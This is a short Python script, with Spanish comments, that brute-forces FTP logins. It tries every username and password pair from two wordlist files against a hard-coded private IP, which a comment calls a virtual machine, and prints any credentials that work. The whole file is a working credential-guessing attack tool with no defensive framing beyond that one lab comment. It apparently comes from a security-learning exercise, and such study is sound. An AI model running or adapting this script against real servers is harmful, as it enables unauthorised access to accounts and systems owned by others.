import sys
import ftplib #libreria de cliente para el protocolo


def bruteforce_ftp(target, usuario, contrasenia):
    ftp = ftplib.FTP(target) # para la ip de la maquina virtual
    try:
        ftp.login(usuario, contrasenia) #aqui nos logueamos con un usuario y contraseña
        ftp.quit() # esto es para salir
        print('se encontraron las credenciales')
        print('{}:{}'.format(usuario, contrasenia)) #concatenamos los usuarios y contraseñas
    except:
        print('fallo la autenticacion {}:{}'.format(usuario, contrasenia)) #concatenamos y imprimimos el fallo


def main():
    target = '192.168.1.11' #ponemos el ip de la maquina virtual
    users = open('user.txt', 'r') #abrimos el diccionario de usuarios en modo lectura
    users = users.read().split('\n') #llamamos a la lectura con un salto de linea
    passwords = open('pass.txt', 'r') # abrimos el diccionario de contraseñas en modo lectura
    passwords = passwords.read().split('\n') #llamamos a la lectura con un salto de linea

    for user in users: # recorremos todos los usuarios
        for password in passwords: # recorremos todas las contraseñas
            bruteforce_ftp(target, user, password) #aqui pasamos el target usuario y contraseña


if __name__ == '__main__': #condicional de igualdad para usuario y contraseña
    try:
     main() # llamamos a main para cumplir con la condicional if
    except KeyboardInterrupt:
        sys.exit() #salimos del programa

